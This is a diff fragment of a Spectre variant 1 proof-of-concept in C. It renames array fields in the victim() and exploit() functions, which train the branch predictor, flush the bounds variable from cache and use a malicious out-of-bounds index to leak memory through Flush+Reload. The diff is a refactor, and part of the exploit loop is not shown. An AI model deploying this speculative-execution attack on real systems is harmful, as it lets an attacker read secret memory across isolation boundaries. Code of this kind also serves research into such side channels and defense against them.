@@ -24,18 +24,18 @@
 uint8_t temp = 0; // To not optimize victim() function
 
 void victim(size_t x) {
-    if (x < buffer.array1_size) {
-        temp &= buffer.array2[buffer.array1[x] * CACHE_PAGE];
+    if (x < buffer.indices_size) {
+        temp &= buffer.table[buffer.indices[x] * CACHE_PAGE];
     }
 }
 
 size_t exploit(size_t address, int tries) {
-    size_t malicious_x = address - (size_t)buffer.array1;   // Set a malicious (speculative) array index
-    size_t training_x = tries % buffer.array1_size;         // Set a valid (training) array index
+    size_t malicious_x = address - (size_t)buffer.indices;  // Set a malicious (speculative) array index
+    size_t training_x = tries % buffer.indices_size;        // Set a valid (training) array index
     
     // 30 loops: 5 training runs (x = training_x), one attack run (x = malicious_x)
     for (int i = 29; i >= 0; i--) {
-        _mm_clflush(&buffer.array1_size);           // Flush array size from cache to force branch prediction
+        _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
         flush_pipeline;
         
         // Bit twiddling to set x = training_x if j % 6 != 0 or malicious_x if j % 6 == 0
@@ -48,7 +48,7 @@ size_t exploit(size_t address, int tries) {
     }
     
     // Return the training index to exclude it from Flush+Reload test
-    return buffer.array1[training_x];
+    return buffer.indices[training_x];
 }
 
 int main(int argc, const char **argv) {
